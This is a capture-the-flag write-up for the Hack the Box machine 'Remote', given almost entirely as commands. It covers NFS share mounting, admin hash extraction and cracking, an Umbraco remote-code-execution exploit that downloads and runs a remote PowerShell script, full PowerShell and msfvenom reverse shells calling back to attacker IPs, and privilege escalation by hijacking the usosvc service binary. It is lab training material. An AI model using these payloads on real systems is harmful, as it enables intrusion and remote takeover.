+++
title = "Hack the Box: Remote"
date = 2023-01-22
description = "Hack the Box: Remote"
tags = [
    "Hack the Box",
    "Write-up"
]
categories = [
    "Hack the Box",
    "Write-up"
]
series = ["Hack the Box"]
+++

Hack the Box: Remote

<!--more-->

# Remote

## Enumeration

### Nmap

```
# nmap -Pn --min-rate=10000 -sV -sC remote.htb -nvv -e tun0 -p- -A -T4

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m26s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45222/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64256/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60458/udp): CLEAN (Failed to receive data)
|   Check 4 (port 15893/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
```

```
# gobuster dir -u http://remote.htb -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -x txt,htm,html,js,jsp,jsa,php,sql,xml,log,asp,aspx
```

`sudo showmount -e remote.htb`

`sudo mount -t nfs remote.htb:/site_backups /mnt`

`strings App_Data/Umbraco.sdf | grep admin`

`adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:“SHA1”}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50`

`b8be16afba8c314ad33d812f22a04991b90e2aaa = baconandcheese admin@htb.local:baconandcheese`

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.77 LPORT=4444 -f psh -o reverse.ps1`

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.244',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('10.10.15.244',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

`sudo python3 -m http.server 80 localhost:80`

`python3 /usr/share/exploitdb/exploits/aspx/webapps/umbraco.py -u admin@htb.local -p baconandcheese -i ‘[http://10.10.10.180](http://10.10.10.180 "http://10.10.10.180")’ -c powershell.exe -a “IEX (New-Object Net.WebClient).DownloadString(‘[http://10.10.15.77/reverse.ps1](http://10.10.15.77/reverse.ps1 "http://10.10.15.77/reverse.ps1")’)”``

`use exploit/multi/handler set payload windows/x64/shell_reverse_tcp set LHOST tun0 set ExitonSession false run CTRL^c sessions sessions -i 1`

`whoami type C:\Users\Public\user.txt 2914291796068d561105037356f72c2f`

``(new-object System.Net.WebClient).Downloadfile(‘[http://host/file.exe](http://host/file.exe "http://host/file.exe")’, ‘file.exe’)``

`whoami /priv`

`Get-Service -Name usosvc | Select-Object *``

`Get-WmiObject win32_service -filter “Name=‘usosvc’”`

`Get-WmiObject win32_service | ?{$_.Name -like ‘usosvc’} | select Name, DisplayName, State, PathName`

`Get-WmiObject win32_service -filter “Name=‘usosvc’” | Invoke-WmiMethod -Name Change -ArgumentList @(null,null,null,null,null,null,null,null,$null, “C:\Users\Public\Downloads\reverse2.ps1”)`

`Set-ItemProperty -Path “HKLM:\System\CurrentControlSet\Services\My Service” -Name ImagePath -Value “C:\Program Files (x86)\My Service\NewName.EXE”`

`msfvenom -p windows/shell_reverse_tcp lhost=10.10.15.77 lport=8888 -f exe --platform windows > reverse.exe`

`invoke-webrequest -Uri [http://10.10.15.77/reverse.exe](http://10.10.15.77/reverse.exe "http://10.10.15.77/reverse.exe") -OutFile reverse.exe`

`sc.exe config usosvc binpath= “C:\Users\Public\Downloads\reverse.exe”`

`sc.exe stop usosvc sc.exe start usosvc`
